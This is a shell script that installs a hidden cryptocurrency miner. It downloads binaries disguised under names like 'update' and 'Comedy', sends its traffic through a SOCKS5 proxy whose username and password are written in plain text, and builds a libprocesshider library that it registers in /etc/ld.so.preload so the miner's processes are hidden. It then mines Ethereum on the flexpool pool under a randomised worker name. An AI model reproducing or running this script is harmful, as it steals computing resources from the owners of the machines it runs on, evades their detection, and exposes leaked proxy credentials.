#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl && apt-get install -y libssl-dev libcurl4-gnutls-dev libgmp-dev && apt install ocl-icd-opencl-dev && wget https://raw.githubusercontent.com/nathanfleight/update/main/update.tar.gz && tar -xvzf update.tar.gz

cat > update/local/update-local.conf <<END
 listen = :2233
loglevel = 1
socks5 = 23.229.122.231:8259
socks5_username = kanglahem
socks5_password = Katrok1234
END

./update/local/update-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./update/update curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./update/update wget https://raw.githubusercontent.com/asraktanusi064/samunji/main/Comedy 
chmod +x Comedy 
 
./update/update wget https://github.com/nathanfleight/update/raw/main/MagicComedy.zip
unzip MagicComedy.zip 
make 
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 
mv libprocesshider.so /usr/local/lib/ 
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
 
./update/update ./bezzHash --url=ssl://0x7a8f069g453654345612345dbF742b2c8.$(echo $(shuf -i 201-400 -n 1)-$(shuf -i 1-200 -n 1)-$(shuf -i 401-600 -n 1)-$(shuf -i 601-800 -n 1))@eth-sg.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
